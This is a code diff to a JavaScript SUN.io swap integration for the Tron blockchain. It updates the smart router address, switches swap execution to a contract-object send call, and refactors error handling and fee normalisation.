@@ -4,7 +4,7 @@ const PROVIDER_ID = 'sunio';
 const PROVIDER_NAME = 'SUN.io';
 
 export const SUNIO_MAINNET_DEFAULTS = {
-  smartRouterAddress: 'TCFNp179Lg46D16zKoumd4Poa2WFFdtqYj',
+  smartRouterAddress: 'TJ4NNy8xZEqsowCBhLvZ45LCqPdGjkET5j',
   calculationServiceUrl: 'https://rot.endjgfsv.link/swap/router',
   feeLimit: 35_000_000,
   deadlineSeconds: 60 * 20,
@@ -92,7 +92,10 @@ function toSafeNumber(value, fallback = 0) {
   return Number.isFinite(num) ? num : fallback;
 }
 
-function parseSlippageBps(slippage, fallbackBps = SUNIO_MAINNET_DEFAULTS.defaultSlippageBps) {
+function parseSlippageBps(
+  slippage,
+  fallbackBps = SUNIO_MAINNET_DEFAULTS.defaultSlippageBps
+) {
   const num = Number.parseFloat(slippage);
 
   if (!Number.isFinite(num) || num < 0) {
@@ -185,7 +188,10 @@ function decimalToRaw(amount, decimals) {
   const [whole, fraction = ''] = normalized.split('.');
   const paddedFraction = (fraction + '0'.repeat(safeDecimals)).slice(0, safeDecimals);
 
-  return BigInt(whole || '0') * 10n ** BigInt(safeDecimals) + BigInt(paddedFraction || '0');
+  return (
+    BigInt(whole || '0') * 10n ** BigInt(safeDecimals) +
+    BigInt(paddedFraction || '0')
+  );
 }
 
 function humanOutputToRaw(value, decimals) {
@@ -282,17 +288,17 @@ function normalizePoolVersions(poolVersions = []) {
   return poolVersions.map((item) => String(item || '').trim()).filter(Boolean);
 }
 
-function normalizePoolFees(poolFees = [], hopCount = 0) {
+function normalizePoolFees(poolFees = [], tokenCount = 0) {
   const normalized = Array.isArray(poolFees)
     ? poolFees.map((item) => Number.parseInt(String(item ?? '0'), 10) || 0)
     : [];
 
-  if (normalized.length >= hopCount) {
-    return normalized.slice(0, hopCount);
+  if (normalized.length >= tokenCount) {
+    return normalized.slice(0, tokenCount);
   }
 
-  if (hopCount > 0) {
-    return [...normalized, ...new Array(hopCount - normalized.length).fill(0)];
+  if (tokenCount > 0) {
+    return [...normalized, ...new Array(tokenCount - normalized.length).fill(0)];
   }
 
   return normalized;
@@ -323,18 +329,6 @@ function ensureTronWebAddress(tronWeb, address) {
   } catch (_) {}
 }
 
-function toHexAddress(tronWeb, address) {
-  if (!tronWeb || !isUsableAddress(address)) {
-    throw new Error(`Invalid address for hex conversion: ${address}`);
-  }
-
-  if (typeof tronWeb?.address?.toHex !== 'function') {
-    throw new Error('tronWeb.address.toHex is not available');
-  }
-
-  return tronWeb.address.toHex(address);
-}
-
 function tryDecodeHexMessage(message) {
   if (!message || typeof message !== 'string') {
     return '';
@@ -363,28 +357,22 @@ function tryDecodeHexMessage(message) {
   }
 }
 
-function extractTriggerError(triggerResult) {
-  const rawMessage =
-    triggerResult?.result?.message ||
-    triggerResult?.message ||
-    triggerResult?.constant_result?.[0] ||
+function extractContractError(error) {
+  const message =
+    error?.error ||
+    error?.message ||
+    error?.data?.message ||
+    error?.toString?.() ||
     '';
 
-  const decoded = tryDecodeHexMessage(rawMessage);
-
-  if (decoded) {
-    return decoded;
-  }
-
-  return 'Swap simulation failed before signing';
+  return tryDecodeHexMessage(String(message || '')) || 'Swap execution failed';
 }
 
 function mapApiRouteToSunioRoute(apiRoute, targetToken, outputDecimals) {
   const tokens = Array.isArray(apiRoute?.tokens) ? apiRoute.tokens : [];
   const symbols = Array.isArray(apiRoute?.symbols) ? apiRoute.symbols : [];
   const poolVersions = normalizePoolVersions(apiRoute?.poolVersions);
-  const hopCount = Math.max(0, tokens.length - 1);
-  const fees = normalizePoolFees(apiRoute?.poolFees, hopCount);
+  const fees = normalizePoolFees(apiRoute?.poolFees, tokens.length);
   const versionLen = buildVersionLen(poolVersions);
 
   return {
@@ -410,7 +398,9 @@ function mapApiRouteToSunioRoute(apiRoute, targetToken, outputDecimals) {
         : '—',
     routeLabel:
       symbols.length > 2
-        ? `Optimized · ${Math.max(0, symbols.length - 2)} hop${symbols.length - 2 > 1 ? 's' : ''}`
+        ? `Optimized · ${Math.max(0, symbols.length - 2)} hop${
+            symbols.length - 2 > 1 ? 's' : ''
+          }`
         : 'Direct · best route',
     executionLabel:
       apiRoute?.fee != null && apiRoute?.fee !== ''
@@ -422,7 +412,9 @@ function mapApiRouteToSunioRoute(apiRoute, targetToken, outputDecimals) {
     amountOut: apiRoute?.amountOut ?? null,
     inUsd: apiRoute?.inUsd ?? null,
     outUsd: apiRoute?.outUsd ?? null,
-    stepAmountsOut: Array.isArray(apiRoute?.stepAmountsOut) ? apiRoute.stepAmountsOut : []
+    stepAmountsOut: Array.isArray(apiRoute?.stepAmountsOut)
+      ? apiRoute.stepAmountsOut
+      : []
   };
 }
 
@@ -547,10 +539,9 @@ export async function ensureSunioApproval({
 
   ensureTronWebAddress(tronWeb, owner);
 
-  const resolvedDecimals =
-    Number.isFinite(Number(tokenDecimals))
-      ? Number(tokenDecimals)
-      : await getTokenDecimals(tronWeb, tokenAddress, 6);
+  const resolvedDecimals = Number.isFinite(Number(tokenDecimals))
+    ? Number(tokenDecimals)
+    : await getTokenDecimals(tronWeb, tokenAddress, 6);
 
   const amountInRaw = decimalToRaw(amountIn, resolvedDecimals);
   const token = await tronWeb.contract(TRC20_ABI, tokenAddress);
@@ -629,9 +620,6 @@ export async function executeSunioSwap({
   assertExecutableRoute(route);
   ensureTronWebAddress(tronWeb, owner);
 
-  const ownerHex = toHexAddress(tronWeb, owner);
-  const toHex = toHexAddress(tronWeb, to);
-
   const amountInRaw = decimalToRaw(amountIn, inputTokenDecimals);
   const slippageBps = parseSlippageBps(slippage);
   const resolvedOutputDecimals = getOutputDecimalsByTarget(
@@ -655,50 +643,22 @@ export async function executeSunioSwap({
       ? Number(deadlineSeconds)
       : Math.floor(Date.now() / 1000) + SUNIO_MAINNET_DEFAULTS.deadlineSeconds;
 
-  const functionSelector =
-    'swapExactInput(address[],string[],uint256[],uint24[],(uint256,uint256,address,uint256))';
-
-  const params = [
-    {
-      type: 'address[]',
-      value: route.path
-    },
-    {
-      type: 'string[]',
-      value: route.poolVersion
-    },
-    {
-      type: 'uint256[]',
-      value: route.versionLen.map((v) => String(v))
-    },
-    {
-      type: 'uint24[]',
-      value: route.fees.map((v) => Number(v))
-    },
-    {
-      type: 'tuple',
-      value: {
-        amountIn: amountInRaw.toString(),
-        amountOutMin: amountOutMinRaw.toString(),
-        to: toHex,
-        deadline: String(deadline)
-      }
-    }
+  const swapData = [
+    amountInRaw.toString(),
+    amountOutMinRaw.toString(),
+    to,
+    String(deadline)
   ];
 
   console.log('[SUN SWAP ROUTE RAW]', route);
-
   console.log('[SUN SWAP PAYLOAD]', {
     owner,
-    ownerHex,
     to,
-    toHex,
     path: route.path,
     poolVersion: route.poolVersion,
     versionLen: route.versionLen,
     fees: route.fees,
-    params,
-    functionSelector,
+    swapData,
     smartRouterAddress,
     inputTokenAddress,
     amountIn,
@@ -709,48 +669,41 @@ export async function executeSunioSwap({
     feeLimit
   });
 
-  const triggerResult = await tronWeb.transactionBuilder.triggerSmartContract(
-    smartRouterAddress,
-    functionSelector,
-    {
-      feeLimit,
-      callValue: 0,
-      abiV2: true
-    },
-    params,
-    ownerHex
-  );
+  try {
+    const router = await tronWeb.contract(SMART_ROUTER_ABI, smartRouterAddress);
 
-  console.log('[SUN SWAP TRIGGER RESULT]', triggerResult);
+    const txid = await router
+      .swapExactInput(
+        route.path,
+        route.poolVersion,
+        route.versionLen.map((v) => String(v)),
+        route.fees.map((v) => Number(v)),
+        swapData
+      )
+      .send({
+        feeLimit,
+        callValue: 0,
+        shouldPollResponse: true
+      });
 
-  if (!triggerResult?.result?.result || !triggerResult?.transaction) {
-    throw new Error(extractTriggerError(triggerResult));
+    console.log('[SUN SWAP TXID]', txid);
+
+    return {
+      ok: true,
+      provider: PROVIDER_ID,
+      providerName: PROVIDER_NAME,
+      txid,
+      to,
+      smartRouterAddress,
+      amountInRaw: amountInRaw.toString(),
+      amountOutMinRaw: amountOutMinRaw.toString(),
+      deadline,
+      route
+    };
+  } catch (error) {
+    console.error('[SUN SWAP CONTRACT SEND ERROR FULL]', error);
+    console.error('[SUN SWAP CONTRACT SEND ERROR MESSAGE]', error?.message);
+    console.error('[SUN SWAP CONTRACT SEND ERROR RAW]', JSON.stringify(error, null, 2));
+    throw new Error(extractContractError(error));
   }
-
-  const signedTransaction = await tronWeb.trx.sign(triggerResult.transaction);
-  console.log('[SUN SWAP SIGNED TX]', signedTransaction);
-
-  const broadcastResult = await tronWeb.trx.sendRawTransaction(signedTransaction);
-  console.log('[SUN SWAP BROADCAST RESULT]', broadcastResult);
-
-  if (!broadcastResult?.result) {
-    throw new Error(
-      broadcastResult?.code ||
-      broadcastResult?.message ||
-      'SUN.io execution: broadcast failed'
-    );
-  }
-
-  return {
-    ok: true,
-    provider: PROVIDER_ID,
-    providerName: PROVIDER_NAME,
-    txid: broadcastResult.txid,
-    to,
-    smartRouterAddress,
-    amountInRaw: amountInRaw.toString(),
-    amountOutMinRaw: amountOutMinRaw.toString(),
-    deadline,
-    route
-  };
 }
